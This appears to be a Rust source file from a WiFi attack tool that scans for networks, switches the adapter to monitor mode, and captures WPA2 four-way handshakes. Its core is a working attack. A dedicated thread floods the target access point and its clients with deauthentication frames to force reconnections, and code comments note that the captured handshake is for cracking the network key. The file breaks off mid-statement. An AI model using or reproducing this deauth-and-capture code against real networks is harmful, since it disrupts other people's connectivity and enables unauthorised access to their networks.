#![allow(clippy::print_literal)]

use crate::core::handshake::extract_eapol_from_packet;
use anyhow::{anyhow, Context, Result};
use pcap::Capture;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::process::Command;
use std::str;
use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

fn get_all_wifi_channels() -> Vec<u32> {
    let mut channels = Vec::new();

    // =========================
    // 2.4 GHz (IEEE 802.11)
    // =========================
    // Channels 1–13 (14 is restricted in most world)
    for ch in 1..=13 {
        channels.push(ch);
    }

    // =========================
    // 5 GHz (IEEE 802.11a/n/ac/ax)
    // =========================
    // Valid 5 GHz channels are multiples of 4 from 36 to 165
    // as defined by IEEE (UNII-1, UNII-2, UNII-2e, UNII-3)
    let mut ch = 36;
    while ch <= 165 {
        channels.push(ch);
        ch += 4;
    }

    // =========================
    // 6 GHz (Wi-Fi 6E / Wi-Fi 7)
    // =========================
    // Channels 1–233 (5925–7125 MHz)
    for ch in 1..=233 {
        channels.push(ch);
    }

    channels
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub channel: String,
    pub signal_strength: String,
    pub security: String,
}

impl std::fmt::Display for WifiNetwork {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Show channels if multiple AP addresses exist for same SSID
        if self.channel.contains(',') {
            write!(f, "{} (Channels: {})", self.ssid, self.channel)
        } else {
            write!(f, "{} (Ch {})", self.ssid, self.channel)
        }
    }
}

/// Compact duplicate networks (same SSID, different AP addresses/channels)
/// This is common with:
/// - Mesh networks
/// - Routers with multiple radios (2.4GHz + 5GHz)
/// - Smart Connect / Band Steering
pub fn compact_duplicate_networks(networks: Vec<WifiNetwork>) -> Vec<WifiNetwork> {
    use std::collections::HashMap;

    let mut ssid_map: HashMap<String, Vec<WifiNetwork>> = HashMap::new();

    // Group networks by SSID
    for network in networks {
        ssid_map
            .entry(network.ssid.clone())
            .or_default()
            .push(network);
    }

    let mut compacted = Vec::new();

    for (_ssid, mut networks) in ssid_map {
        if networks.len() == 1 {
            // Single network, no duplication
            compacted.push(networks.pop().unwrap());
        } else {
            // Multiple networks with same SSID - compact them
            // Sort by signal strength (strongest first)
            networks.sort_by(|a, b| {
                let a_rssi = a.signal_strength.parse::<i32>().unwrap_or(-100);
                let b_rssi = b.signal_strength.parse::<i32>().unwrap_or(-100);
                b_rssi.cmp(&a_rssi) // Higher (less negative) is better
            });

            // Use the strongest signal's AP address as primary
            let primary = networks[0].clone();

            // Collect all channels and AP addresses
            let mut channels = Vec::new();
            let mut bssids = Vec::new();

            for net in &networks {
                if !channels.contains(&net.channel) {
                    channels.push(net.channel.clone());
                }
                if !bssids.contains(&net.bssid) {
                    bssids.push(net.bssid.clone());
                }
            }

            // Create compacted entry
            compacted.push(WifiNetwork {
                ssid: primary.ssid,
                bssid: if bssids.len() > 1 {
                    format!("{} (+{} more)", primary.bssid, bssids.len() - 1)
                } else {
                    primary.bssid
                },
                channel: channels.join(","),
                signal_strength: primary.signal_strength,
                security: primary.security,
            });
        }
    }

    // Sort by SSID for consistent display
    compacted.sort_by(|a, b| a.ssid.cmp(&b.ssid));

    compacted
}

pub fn scan_networks(interface: &str) -> Result<Vec<WifiNetwork>> {
    println!("{} Scanning for networks...", "[*]");

    // Note: We DON'T disconnect WiFi for a simple scan
    // (disconnection is only needed for packet capture to improve reliability)

    // Linux: iw (headless, root) with an nmcli fallback.
    if cfg!(target_os = "linux") {
        return scan_networks_linux(interface);
    }

    // MAC OS implementation
    // try to use native airport first, then fallback to swift script if airport is missing
    // Actually, we found airport is missing on this system.
    // We will implement a Swift-based scanner which uses CoreWLAN (same as system menu).

    // First, try our Embedded Swift Scanner (most reliable on modern macOS)
    if let Ok(networks) = scan_networks_swift() {
        if !networks.is_empty() {
            let compacted = compact_duplicate_networks(networks);
            return Ok(compacted);
        }
    }

    // Fallback: Try legacy airport binary (just in case)
    if let Some(airport_binary) = find_airport_path() {
        if let Ok(output) = Command::new(&airport_binary).args(["-s"]).output() {
            if output.status.success() {
                let stdout =
                    str::from_utf8(&output.stdout).context("Failed to parse command output")?;
                return parse_airport_output(stdout); // Renamed from parse_scan_output
            }
        }
    }

    // Final Fallback: Use pcap scan
    println!(
        "{} Native tools failed. Falling back to pcap scan...",
        "[!]"
    );
    println!("{} This may be slower and limited.", "[*]");
    scan_pcap(interface)
}

fn parse_airport_output(output: &str) -> Result<Vec<WifiNetwork>> {
    let mut networks = Vec::new();

    // Header: SSID AP RSSI CHANNEL HT CC SECURITY ...
    let bssid_re = Regex::new(r"([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})").unwrap();

    let lines: Vec<&str> = output.lines().collect();

    for line in lines {
        let line = line.trim();
        if line.starts_with("SSID") || line.is_empty() {
            continue;
        }

        if let Some(mat) = bssid_re.find(line) {
            let bssid = mat.as_str().to_string();
            let ssid = line[0..mat.start()].trim().to_string(); // SSID is left of AP address

            let remainder = &line[mat.end()..]; // Right of BSSID
                                                // Format: RSSI CHANNEL HT CC SECURITY ...
                                                // e.g. " -80  11      Y  US WPA2(PSK/AES/AES) "

            let parts: Vec<&str> = remainder.split_whitespace().collect();
            if parts.len() >= 2 {
                let rssi = parts[0];
                let channel = parts[1];

                // Security is the rest
                let security = if parts.len() >= 5 {
                    // parts[0]=rssi, [1]=ch, [2]=HT, [3]=CC, [4..]=Security
                    parts[4..].join(" ")
                } else {
                    // Sometimes HT/CC are missing?
                    if parts.len() > 2 {
                        parts[2..].join(" ")
                    } else {
                        "Unknown".to_string()
                    }
                };

                networks.push(WifiNetwork {
                    ssid: if ssid.is_empty() {
                        "<Hidden>".to_string()
                    } else {
                        ssid
                    },
                    bssid,
                    channel: channel.to_string(),
                    signal_strength: rssi.to_string(),
                    security,
                });
            }
        }
    }
    Ok(networks)
}

/// Check if WiFi interface is currently connected to a network
/// Returns Some(ssid) if connected, None otherwise
fn check_wifi_connected() -> Option<String> {
    if cfg!(target_os = "linux") {
        return check_wifi_connected_linux();
    }
    use std::process::Command;

    eprintln!("[DEBUG] check_wifi_connected() called");

    // Use Swift/CoreWLAN for reliable WiFi status (modern macOS approach)
    let script_content = r#"
import CoreWLAN
import Foundation

let client = CWWiFiClient.shared()
if let interface = client.interface() {
    if let ssid = interface.ssid() {
        if !ssid.isEmpty {
            print(ssid)
            exit(0)
        }
    }
}
// Not connected or no SSID
exit(1)
"#;

    let script_path = "/tmp/wifi_check.swift";

    // Write script
    if let Err(e) = std::fs::write(script_path, script_content) {
        eprintln!("[ERROR] Failed to write Swift script: {}", e);
        return None;
    }

    eprintln!("[DEBUG] Executing Swift script for WiFi check...");
    let start = std::time::Instant::now();

    // Execute
    let output = match Command::new("swift").arg(script_path).output() {
        Ok(out) => out,
        Err(e) => {
            eprintln!("[ERROR] Failed to execute Swift: {}", e);
            return None;
        }
    };

    let elapsed = start.elapsed();
    eprintln!("[DEBUG] Swift execution took {:?}", elapsed);

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !stderr.is_empty() {
        eprintln!("[DEBUG] Swift stderr: {}", stderr.trim());
    }

    if output.status.success() {
        let ssid = stdout.trim().to_string();
        if !ssid.is_empty() {
            eprintln!("[DEBUG] ✓ WiFi connected to: '{}'", ssid);
            return Some(ssid);
        } else {
            eprintln!("[DEBUG] Swift succeeded but returned empty SSID");
        }
    } else {
        eprintln!(
            "[DEBUG] Swift exited with status: {:?}",
            output.status.code()
        );
        eprintln!("[DEBUG] stdout: {}", stdout.trim());
    }

    eprintln!("[DEBUG] ✗ WiFi not connected");
    None
}

/// Get current connected SSID on macOS (if any)
pub fn wifi_connected_ssid() -> Option<String> {
    check_wifi_connected()
}

/// Disconnect from WiFi
pub fn disconnect_wifi() -> Result<()> {
    if cfg!(target_os = "linux") {
        return disconnect_wifi_linux();
    }
    use std::io::Write;

    println!("{}", "🔌 Disconnecting from WiFi...");

    // Use Swift to disconnect using CoreWLAN
    let script_content = r#"
import CoreWLAN

let client = CWWiFiClient.shared()
if let interface = client.interface() {
    interface.disassociate()
    print("Disconnected")
} else {
    print("No interface")
    exit(1)
}
"#;

    let script_path = "/tmp/wifi_disconnect.swift";
    let mut file = std::fs::File::create(script_path)?;
    file.write_all(script_content.as_bytes())?;

    let output = Command::new("swift").arg(script_path).output()?;

    if output.status.success() {
        println!("{}", "✓ WiFi disconnected");
        Ok(())
    } else {
        Err(anyhow!("Failed to disconnect WiFi"))
    }
}

/// Parameters for traffic capture
pub struct CaptureOptions<'a> {
    pub interface: &'a str,
    pub channel: Option<u32>,
    pub ssid: Option<&'a str>,
    pub bssid: Option<&'a str>,
    pub output_file: &'a str,
    pub duration: Option<u64>,
    pub no_deauth: bool,
    pub running: Option<Arc<AtomicBool>>, // External control for stopping
    /// When set to `true` externally, the engine sends a single targeted deauth
    /// burst against the current AP and clears the flag. Independent of
    /// `no_deauth` so the user can trigger bursts on demand.
    pub deauth_requested: Option<Arc<AtomicBool>>,
    /// Optional human-readable progress sink (wired to the GUI activity log).
    /// Capture/deauth diagnostics go here in addition to stdout.
    pub log: Option<Arc<dyn Fn(&str) + Send + Sync>>,
}

/// Capture traffic to a file
///
/// If `ssid` or `bssid` is provided, it attempts to:
/// 1. Find the BSSID (AP MAC) from Beacon/ProbeResponse frames
/// 2. Send deauthentication frames to connected clients to force a handshake (if not disabled)
///
/// Returns Ok(Some(ssid)) if a handshake was successfully captured,
/// Ok(None) if capture stopped without finding a complete handshake,
/// or Err() on error.
pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
    let interface = options.interface;
    let channel = options.channel;
    let ssid = options.ssid;
    let bssid = options.bssid;
    let output_file = options.output_file;
    let duration = options.duration;
    let no_deauth = options.no_deauth;
    let deauth_requested = options.deauth_requested.clone();
    let log = capture_logger(&options.log);
    println!("{}", "📡 Starting packet capture...");
    println!("Interface: {}", interface);
    println!("Output: {}", output_file);
    if let Some(target) = ssid {
        println!("Target SSID: {}", target);
    }
    if let Some(target_bssid) = bssid {
        println!("Target BSSID: {}", target_bssid);
    }

    // Parse BSSID if provided
    let parsed_bssid = if let Some(b) = bssid {
        Some(parse_mac(b)?)
    } else {
        None
    };

    // macOS packet injection warning
    if !no_deauth {
        println!();
        log("⚠️ macOS LIMITATION: Apple Silicon Macs do not support raw packet injection.");
        log("💡 If the deauth sender reports TX errors, force the handshake manually: turn the target device's WiFi OFF then ON.");
        println!();
    } else {
        log("ℹ️ Passive capture mode (deauth disabled)");
    }

    // ========================================================================
    // Check if WiFi is connected - auto-disconnect for better capture
    // ========================================================================
    if let Some(connected_ssid) = check_wifi_connected() {
        println!();
        println!("📡 Connected to: '{}'", connected_ssid);
        println!("   Auto-disconnecting for better capture...");

        // Auto-disconnect
        if let Ok(()) = disconnect_wifi() {
            std::thread::sleep(Duration::from_secs(1));
            println!("{}", "   ✓ Disconnected successfully");
        } else {
            println!("{}", "   ⚠️  Could not auto-disconnect");
            println!(
                "{}",
                "   💡 Manually disconnect: Option+Click WiFi icon → Disconnect"
            );
            std::thread::sleep(Duration::from_secs(2));
        }
        println!();
    }

    // ========================================================================
    // CRITICAL: Perform SSID/channel scanning BEFORE opening monitor mode!
    // The airport -s scan does not work when the interface is in monitor mode.
    // ========================================================================

    // Debug log for parameters
    eprintln!(
        "[DEBUG] capture_traffic called with channel: {:?}, ssid: {:?}, bssid: {:?}",
        channel, ssid, bssid
    );

    let mut channels_to_scan = Vec::new();

    if let Some(target_ssid) = ssid {
        // User wants to capture a specific SSID
        if let Some(ch) = channel {
            // Both SSID and channel specified - use the provided channel directly
            channels_to_scan.push(ch);
            println!(
                "ℹ️  Monitoring '{}' on Channel {} (manual)",
                target_ssid, ch
            );
        } else if channel.is_none() {
            // SSID specified but no channel - auto-detect channels
            println!("🔍 Scanning for all channels (Smart Connect support)...");
            println!("   (Scanning BEFORE enabling monitor mode)");

            // Perform scan while interface is still in managed mode
            let networks = detect_all_channels_for_ssid(target_ssid, interface);

            if networks.is_empty() {
                println!(
                    "⚠️  Could not detect '{}'. Will scan ALL channels.",
                    target_ssid
                );
                println!("   💡 Tip: Make sure the network is broadcasting and you're in range.");
                // Fallback: scan ALL possible channels
                channels_to_scan = get_all_wifi_channels();
            } else {
                println!(
                    "✓ Found '{}' on {} channel(s):",
                    target_ssid,
                    networks.len()
                );
                for net in &networks {
                    let band_str = match net.band {
                        WifiBand::Band24GHz => "2.4GHz",
                        WifiBand::Band5GHz => "5GHz",
                    };
                    println!(
                        "  • Ch {} ({}) | BSSID: {} | RSSI: {} dBm",
                        net.channel, band_str, net.bssid, net.rssi
                    );
                    channels_to_scan.push(net.channel);
                }
                let rotation_msg = if channels_to_scan.len() > 10 {
                    format!("🔄 Will rotate through {} channel(s) every 5 seconds (Smart Connect + DFS support)", channels_to_scan.len())
                } else {
                    format!(
                        "🔄 Will rotate through {} channel(s) every 10 seconds",
                        channels_to_scan.len()
                    )
                };
                println!("{}", rotation_msg);
            }
        }
    } else if let Some(target_bssid_str) = bssid {
        if channel.is_none() {
            // No SSID, but BSSID provided
            println!("🔍 Scanning for BSSID {}...", target_bssid_str);

            let networks = detect_channels_for_bssid(target_bssid_str);

            if networks.is_empty() {
                println!(
                    "⚠️  Could not detect BSSID '{}'. Will scan ALL channels.",
                    target_bssid_str
                );
                channels_to_scan = get_all_wifi_channels();
            } else {
                println!(
                    "✓ Found BSSID {} on {} channel(s):",
                    target_bssid_str,
                    networks.len()
                );
                for net in &networks {
                    println!("  • Ch {} | RSSI: {} dBm", net.channel, net.rssi);
                    channels_to_scan.push(net.channel);
                }
            }
        }
    } else if channel.is_none() {
        // No SSID specified - scan all channels
        println!("ℹ️  No target SSID/BSSID specified. Scanning ALL channels.");
        channels_to_scan = get_all_wifi_channels();
    } else {
        // Manual channel specified
        if let Some(ch) = channel {
            channels_to_scan.push(ch);
            println!("ℹ️  Monitoring on Channel {} (manual)", ch);
        }
    }

    if channels_to_scan.is_empty() {
        println!("⚠️  No channels to scan. Please specify --channel manually.");
        return Err(anyhow!("No channels detected"));
    }

    // ========================================================================
    // NOW open capture in monitor mode (after scanning is complete)
    // ========================================================================

    println!("{}", "📡 Opening interface in monitor mode...");

    // Linux: mac80211 wants monitor mode via ip/iw before capture opens —
    // libpcap's own rfmon is unreliable there. Restored when capture ends.
    #[cfg(target_os = "linux")]
    let _linux_monitor_guard = LinuxMonitorGuard::enter(interface, &log);

    // Use external running control if provided, otherwise create a new one
    let running = options.running.unwrap_or_else(|| {
        let r = Arc::new(AtomicBool::new(true));
        let r_clone = r.clone();
        ctrlc::set_handler(move || {
            r_clone.store(false, Ordering::SeqCst);
        })
        .ok();
        r
    });

    // Open capture in monitor mode (rfmon only on macOS — on Linux the
    // LinuxMonitorGuard above already switched the interface manually).
    let cap_builder = Capture::from_device(interface)
        .context("Failed to find device")?
        .promisc(true)
        .rfmon(cfg!(target_os = "macos")); // Critical for monitor mode

    let mut cap = cap_builder
        .timeout(100) // 100ms timeout for read
        .open()
        .map_err(|e| anyhow!("Failed to open capture device: {}", e))?;

    println!("{}", "✓ Monitor mode enabled");

    let mut savefile = cap
        .savefile(output_file)
        .context("Failed to create output file")?;

    println!("{}", "🟢 Capturing... (Press Ctrl+C to stop)");

    let start = std::time::Instant::now();
    let mut packets_count: u64 = 0;

    // Channel rotation state
    let mut current_channel_idx = 0;
    let mut last_channel_switch = std::time::Instant::now();
    // Adaptive dwell time: if scanning many channels, rotate faster
    let channel_dwell_time = if channels_to_scan.len() > 10 {
        Duration::from_secs(5) // 5 seconds per channel for many channels
    } else {
        Duration::from_secs(10) // 10 seconds per channel for few channels
    };
    let mut handshake_found = false; // Stop rotation when handshake is complete

    // Set initial channel
    if !channels_to_scan.is_empty() {
        let initial_ch = channels_to_scan[0];
        if set_channel_for_os(interface, initial_ch) {
            println!("📡 Starting on Channel {}", initial_ch);
        } else {
            log(&format!(
                "⚠️ Could not switch to channel {initial_ch} — capturing on the interface's current channel"
            ));
        }
    }

    // State for deauth attack
    let mut target_bssid: Option<[u8; 6]> = parsed_bssid;
    let mut last_deauth = std::time::Instant::now();
    let mut deauth_tx_dead = false; // Fallback path: stop once TX is known-bad
                                    // Helper to find BSSID from SSID if needed
    let target_ssid_bytes = ssid.map(|s| s.as_bytes());

    // ---- Parallel deauth sender ----
    // State shared with a dedicated sender thread so deauth frames go out
    // continuously, in parallel with packet capture, instead of a small burst
    // every 0.5s from the capture loop.
    let shared_bssid: Arc<Mutex<Option<[u8; 6]>>> = Arc::new(Mutex::new(parsed_bssid));
    let shared_clients: Arc<Mutex<Vec<[u8; 6]>>> = Arc::new(Mutex::new(Vec::new()));

    // Try to open a *second* injection handle on the same interface so sending
    // never blocks the capture read. If the OS refuses a second monitor-mode
    // handle (common on macOS), we fall back to in-loop bursts below.
    let inject_handle = if !no_deauth {
        match Capture::from_device(interface) {
            Ok(dev) => dev
                .promisc(true)
                .rfmon(cfg!(target_os = "macos"))
                .timeout(100)
                .open()
                .ok(),
            Err(_) => None,
        }
    } else {
        None
    };

    let parallel_deauth_active = if let Some(mut inj) = inject_handle {
        let running_t = running.clone();
        let bssid_t = shared_bssid.clone();
        let clients_t = shared_clients.clone();
        let log_t = log.clone();
        thread::spawn(move || {
            log_t("🚀 Parallel deauth sender started (continuous, as fast as the driver allows)");
            let mut successes: u64 = 0;
            let mut failures: u64 = 0;
            let mut first_error: Option<String> = None;
            while running_t.load(Ordering::SeqCst) {
                let bssid_opt = *bssid_t.lock().unwrap();
                let Some(bssid) = bssid_opt else {
                    // Target AP not identified yet — wait for the capture loop.
                    thread::sleep(Duration::from_millis(100));
                    continue;
                };

                let clients = clients_t.lock().unwrap().clone();
                let broadcast: [u8; 6] = [0xFF; 6];
                let mut batch_errors: u64 = 0;
                // Tight batch: broadcast + every known client, repeated.
                for _ in 0..20 {
                    for target in std::iter::once(&broadcast).chain(clients.iter()) {
                        match send_deauth(&mut inj, &bssid, target) {
                            Ok(()) => successes += 1,
                            Err(e) => {
                                failures += 1;
                                batch_errors += 1;
                                if first_error.is_none() {
                                    first_error = Some(e.to_string());
                                    log_t(&format!("⚠️ Deauth TX error: {e}"));
                                }
                            }
                        }
                    }
                }

                // Diagnose TX health once we have enough samples.
                if successes == 0 && failures >= 100 {
                    log_t("❌ Raw Wi-Fi injection is blocked on this Mac — deauth frames cannot be sent.");
                    log_t("💡 Force the handshake instead: on the target device turn WiFi OFF and ON (or forget/rejoin the network).");
                    log_t("🛑 Parallel deauth sender stopped");
                    return;
                }
                if successes == 1 && first_error.is_none() {
                    log_t("✅ Deauth TX is working — jamming the target AP");
                }

                // Minimal pause so we don't peg a core or overrun the TX ring;
                // back off a bit when the driver is erroring mid-batch.
                if batch_errors > 0 {
                    thread::sleep(Duration::from_millis(50));
                } else {
                    thread::sleep(Duration::from_millis(1));
                }
            }
            log_t("🛑 Parallel deauth sender stopped");
        });
        true
    } else {
        if !no_deauth {
            log("⚠️ Could not open a second injection handle; falling back to in-capture deauth bursts.");
        }
        false
    };

    // State for handshake detection
    let mut pending_handshakes: HashMap<[u8; 6], [u8; 32]> = HashMap::new(); // Client Mac -> Anonce (from M1)
    let mut bssid_to_ssid: HashMap<[u8; 6], String> = HashMap::new(); // BSSID -> SSID mapping
    let _last_valid_packet = std::time::Instant::now(); // To detect if we are "stuck" on a quiet channel
    let mut consecutive_partial_handshakes = 0; // To detect if we are on a side channel (hearing M2/M4 but not M1)

    while running.load(Ordering::SeqCst) {
        if let Some(d) = duration {
            if start.elapsed().as_secs() >= d {
                break;
            }
        }

        // 1. Capture packet
        match cap.next_packet() {
            Ok(packet) => {
                // Save to file
                savefile.write(&packet);
                packets_count += 1;

                // Handshake Detection
                if let Some(eapol) = extract_eapol_from_packet(packet.data) {
                    // "Smart Dwell": If we detect EAPOL (even from unknown BSSID if we have a target), we should extend scan time
                    // But if we have a target_bssid, we prioritize matching that.

                    // "Promiscuous Handshake": Capture ALL handshakes.
                    // If the user specified a target BSSID, but we see a handshake for another BSSID,
                    // it is VERY likely the same router on another band (or user error).
                    let is_target = if let Some(target) = target_bssid {
                        if eapol.ap_mac == target {
                            true
                        } else {
                            // "Fuzzy Match" - Check if first 3 bytes (OUI) match, or just log it
                            false
                        }
                    } else {
                        // No specific BSSID target, so everything is potentially a target
                        true
                    };

                    // ALWAYS process EAPOL, but color code based on if it matches target
                    let _is_interesting = true; // We want everything now

                    if _is_interesting {
                        // Smart Dwell Anti-Stuck:
                        // If we see too many M2/M4 without M1, force rotation
                        if consecutive_partial_handshakes > 5 {
                            println!("⚠️  Too many partial handshakes without M1. Force rotating channel...");
                            consecutive_partial_handshakes = 0;
                            last_channel_switch = std::time::Instant::now() - channel_dwell_time;
                        // Force switch
                        } else {
                            // Smart Dwell: Reset channel switch timer to stay on this active channel
                            if last_channel_switch.elapsed().as_secs() > 2 {
                                last_channel_switch = std::time::Instant::now();
                                println!(
                                    "⏳ Activity detected on Channel {} - Extending scan...",
                                    channels_to_scan[current_channel_idx]
                                );
                            }
                        }

                        match eapol.message_type {
                            1 => {
                                // M1: Store Anonce
                                consecutive_partial_handshakes = 0; // Valid M1 seen! We are likely on good channel.
                                if let Some(anonce) = eapol.anonce {
                                    pending_handshakes.insert(eapol.client_mac, anonce);
                                    println!("\n🔑 M1 (ANonce) - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                        eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                        eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                        eapol.replay_counter
                                    );
                                }
                            }
                            2 => {
                                // M2: Check if we have M1
                                println!("\n🔐 M2 (SNonce+MIC) - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                );

                                if let Some(_stored_anonce) =
                                    pending_handshakes.get(&eapol.client_mac)
                                {
                                    // ... check for handshake completion ...
                                    let captured_ssid = bssid_to_ssid.get(&eapol.ap_mac);
                                    let is_target_network = if let Some(target_ssid_str) = ssid {
                                        captured_ssid
                                            .map(|s| s.as_str() == target_ssid_str)
                                            .unwrap_or(false)
                                    } else {
                                        true
                                    };

                                    if is_target_network {
                                        println!("\n🎉 COMPLETE HANDSHAKE (M1+M2) for Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                            eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5]
                                        );

                                        if let Some(network_ssid) = captured_ssid {
                                            println!("✅ Target SSID: '{}'", network_ssid);
                                        }

                                        if !handshake_found {
                                            handshake_found = true;
                                            // ... stop capture ...
                                            let current_ch = channels_to_scan[current_channel_idx];
                                            println!(
                                                "🔒 Locked on Channel {} - Handshake complete!",
                                                current_ch
                                            );

                                            // Warn if BSSID mismatch
                                            if !is_target {
                                                // ...
                                                if let Some(t_bssid) = target_bssid {
                                                    println!("⚠️  NOTE: Captured BSSID {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} does not match Target {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                                        eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                                        t_bssid[0], t_bssid[1], t_bssid[2], t_bssid[3], t_bssid[4], t_bssid[5]
                                                     );
                                                }
                                            }

                                            println!("⏳ Waiting 2 more seconds to capture any remaining packets...");
                                            std::thread::sleep(Duration::from_secs(2));
                                            println!("🎯 Stopping capture automatically...");
                                            running.store(false, Ordering::SeqCst);
                                        }
                                    } else {
                                        let wrong_ssid =
                                            captured_ssid.map(|s| s.as_str()).unwrap_or("Unknown");
                                        println!("\n⚠️  COMPLETE HANDSHAKE found but for wrong network: '{}'", wrong_ssid);
                                        println!(
                                            "   Waiting for target SSID: '{}'",
                                            ssid.unwrap_or("N/A")
                                        );
                                    }
                                } else {
                                    println!(
                                        "   ⚠️  M2 without matching M1 (might be out of order)"
                                    );

                                    // NEW: If we see M2/M4 but missed M1, we can sometimes still crack it (if we have PMKID in M1 or just try PMK computation against MIC)
                                    // BUT WPA2 requires M1 Anonce.
                                    // However, for the sake of "saving" the capture, we should perhaps count this as a "Partial Capture" success if the user wants.
                                    // For now, let's just log it clearly.
                                    // Actually, if we miss M1, we are doomed for WPA2 cracking. M1 has Anonce.
                                    // M2 has Snonce + MIC.
                                    // MIC verification needs PTK. PTK needs Anonce + Snonce.
                                    // So M1 is MANDATORY.
                                    // Unless we can guess Anonce? No, it's random.
                                    // SO: We MUST have M1.
                                }
                            }
                            3 => {
                                println!("\n🔄 M3 - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.replay_counter
                                );
                            }
                            4 => {
                                println!("\n✅ M4 - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                );
                            }
                            _ => {
                                println!("\n❓ Unknown EAPOL type {} from {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                    eapol.message_type,
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                                );
                            }
                        }
                    } else {
                        // EAPOL from different AP
                        println!("\n📦 EAPOL M{} from different AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (ignored)",
                            eapol.message_type,
                            eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                        );
                    }
                }

                if packets_count.is_multiple_of(50) {
                    let elapsed = start.elapsed().as_secs();
                    let rate = packets_count.checked_div(elapsed).unwrap_or(0);
                    print!(
                        "\r📦 Packets: {} | Rate: {}/s | M1s: {} | Elapsed: {}s   ",
                        packets_count,
                        rate,
                        pending_handshakes.len(),
                        elapsed
                    );
                    use std::io::Write;
                    std::io::stdout().flush().unwrap();
                }

                // Discovery Logic: Scan all beacons to map BSSID -> SSID
                if let Some((bssid, network_ssid)) = parse_bssid_and_ssid_from_packet(packet.data) {
                    // Check if this is a NEW network we haven't seen before
                    let is_new_network = !bssid_to_ssid.contains_key(&bssid);

                    // Store BSSID -> SSID mapping
                    bssid_to_ssid.entry(bssid).or_insert(network_ssid.clone());

                    // Check if this is our target SSID
                    let is_target = if let Some(target_ssid) = target_ssid_bytes {
                        network_ssid.as_bytes() == target_ssid
                    } else {
                        false
                    };

                    // Display ALL networks detected (not just target)
                    if is_new_network {
                        let current_ch = channels_to_scan[current_channel_idx];

                        if is_target {
                            // Target network - show in GREEN and BOLD
                            println!("\n🎯 Found Target SSID '{}' with BSSID: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} on Channel {}",
                                network_ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], current_ch);

                            target_bssid = Some(bssid);
                            println!("🚀 Starting deauthentication attacks...");
                            println!("🔄 Continuing channel rotation for Smart Connect support");
                        } else {
                            // Other network - show dimmed for context
                            println!("\n📡 Detected SSID '{}' - {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} on Channel {}",
                                network_ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], current_ch);
                        }
                    }
                }
            }
            Err(pcap::Error::TimeoutExpired) => {
                // Timeout is fine, lets us check deauth timer
            }
            Err(e) => {
                // Some errors might be recoverable
                eprintln!("\nRead warning: {}", e);
            }
        }

        // 2. Channel Rotation Logic (for Smart Connect multi-band)
        // ONLY rotate if handshake not found yet
        if !handshake_found
            && channels_to_scan.len() > 1
            && last_channel_switch.elapsed() >= channel_dwell_time
        {
            current_channel_idx = (current_channel_idx + 1) % channels_to_scan.len();
            let new_channel = channels_to_scan[current_channel_idx];

            println!(
                "\n🔄 Switching to Channel {} ({}/{})",
                new_channel,
                current_channel_idx + 1,
                channels_to_scan.len()
            );

            if !set_channel_for_os(interface, new_channel) {
                log(&format!(
